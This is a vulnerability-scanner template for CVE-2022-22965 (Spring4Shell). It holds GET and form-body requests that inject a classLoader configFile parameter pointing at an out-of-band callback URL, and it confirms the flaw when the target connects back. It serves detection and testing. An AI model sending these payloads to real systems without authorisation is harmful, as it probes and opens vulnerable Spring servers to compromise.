id: VUL-2022-33321
name: CVE-2022-22965
tags:
    - spring
    - JSP
transport: http
set:
  reverse: reverse
  reverseURL: reverse.url.raw
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?class.module.classLoader.resources.context.configFile={{reverseURL}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
        expression: reverse.wait(5)
        output: null
    r1:
        request:
            cache: true
            method: GET
            path: /
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
               class.module.classLoader.resources.context.configFile={{reverseURL}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
        expression: reverse.wait(5)
        output: null
expression: r0() || r1()
detail:
    fingerprint:
        softhard: ""
        product: ""
        company: ""
        category: ""
        parent_category: ""
    vulnerability:
        proof:
            info: 存在CVE-2022-22965漏洞


reverse: true